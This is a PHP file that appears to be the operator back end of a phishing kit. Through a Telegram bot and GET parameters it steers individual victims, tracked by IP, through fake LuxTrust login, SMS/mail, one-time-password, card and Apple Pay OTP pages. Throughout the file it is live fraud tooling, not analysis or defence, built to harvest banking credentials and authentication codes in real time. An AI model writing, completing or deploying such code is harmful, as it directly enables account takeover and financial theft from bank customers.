<?php

include('functions.php');
include('../config.php');

$update = json_decode(file_get_contents("php://input"), true);

if (isset($update["callback_query"])) {
    
    $callbackQuery = $update["callback_query"];
    $messageId = $callbackQuery["message"]["message_id"];
    $data = $callbackQuery["data"];

    list($action, $ip) = explode('=', $data);

    if ($action == 'lux') {
        writeOnFile("../fr/loading/redirect/lux.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> LuxTrust", null, $messageId);
    } elseif ($action == 'fin') {
        writeOnFile("../fr/loading/redirect/fin.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> FIN", null, $messageId);
    } elseif ($action == 'carteInvalide') {
        writeOnFile("../fr/loading/redirect/carteInvalide.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Carte Invalide", null, $messageId);
    } elseif ($action == 'loginvalide') {
        writeOnFile("../fr/luxtrust/loading/redirect/loginvalide.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Log Invalide", null, $messageId);
    } elseif ($action == 'logvalide') {
        writeOnFile("../fr/luxtrust/loading/redirect/logvalide.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Luxtrust -> SCAN 1", null, $messageId);
    } elseif ($action == 'luxotp1') {
        writeOnFile("../fr/luxtrust/scan/redirect/luxotp1.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Luxtrust -> OTP 1", null, $messageId);
    } elseif ($action == 'luxotp2') {
        writeOnFile("../fr/luxtrust/scan2/redirect/luxotp2.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Luxtrust -> OTP 2", null, $messageId);
    } elseif ($action == 'finlux') {
        writeOnFile("../fr/luxtrust/loading/redirect/fin.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Luxtrust -> FIN", null, $messageId);
    } elseif ($action == 'scan2') {
        writeOnFile("../fr/luxtrust/loading/redirect/scan2.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Luxtrust -> SCAN 2", null, $messageId);
    } elseif ($action == 'otp1invalid') {
        writeOnFile("../fr/luxtrust/loading/redirect/otp1invalid.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Luxtrust -> OTP 1 INVALID", null, $messageId);
    } elseif ($action == 'otp2invalid') {
        writeOnFile("../fr/luxtrust/loading/redirect/otp2invalid.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> Luxtrust -> OTP 2 INVALID", null, $messageId);
    } elseif ($action == 'applepay') {
        writeOnFile("../fr/loading/redirect/applepay.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> OTP APPLE PAY", null, $messageId);
    } elseif ($action == 'applepayinvalid') {
        writeOnFile("../fr/loading/redirect/applepayinvalid.txt", $ip);
        sendMessage($chat_id, "IP : {$ip} -> OTP APPLE PAY -> INVALID", null, $messageId);
    }
}

if (isset($_GET['ip'])) {

    $ip = $_GET['ip'];

    if (isset($_GET['step']) && $_GET['step'] == 'sms') {
        writeOnFile("../de/loading/redirect/sms.txt",$ip);
        echo "IP : {$ip} -> SMS";
    } else if (isset($_GET['step']) && $_GET['step'] == 'mail') {
        writeOnFile("../de/loading/redirect/mail.txt",$ip);
        echo "IP : {$ip} -> MAIL";
    } else if (isset($_GET['step']) && $_GET['step'] == 'fin') {
        writeOnFile("../de/loading/redirect/fin.txt",$ip);
        echo "IP : {$ip} -> FIN";
    } else if (isset($_GET['step']) && $_GET['step'] == 'badlogin') {
        writeOnFile("../de/loading/redirect/badlogin.txt",$ip);
        echo "IP : {$ip} -> BAD LOGIN";
    } else if (isset($_GET['step']) && $_GET['step'] == 'smsinvalid') {
        writeOnFile("../de/loading/redirect/smsinvalid.txt",$ip);
        echo "IP : {$ip} -> BAD SMS";
    } else if (isset($_GET['step']) && $_GET['step'] == 'mailinvalid') {
        writeOnFile("../de/loading/redirect/mailinvalid.txt",$ip);
        echo "IP : {$ip} -> BAD MAIL";
    }
}